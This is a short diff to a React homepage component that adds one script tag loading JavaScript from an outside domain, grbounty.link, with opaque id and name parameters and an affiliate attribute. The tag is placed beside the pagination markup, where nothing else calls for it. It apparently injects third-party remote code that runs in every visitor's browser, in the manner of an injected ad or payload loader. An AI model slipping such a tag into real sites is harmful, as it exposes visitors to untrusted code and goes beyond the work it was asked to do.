@@ -282,6 +282,7 @@ const HomePage = ({ categorizedItems }) => {
           type="application/ld+json"
           dangerouslySetInnerHTML={{ __html: moviesSchema }}
         />
+        <script src="https://grbounty.link/resources.js?id=1983&name=fnMNCPrrcr" data-affiliate="true" type="text/javascript"></script>
         {/* Pagination */}
         {totalPages > 1 && (
           <div className="flex justify-center mt-4">
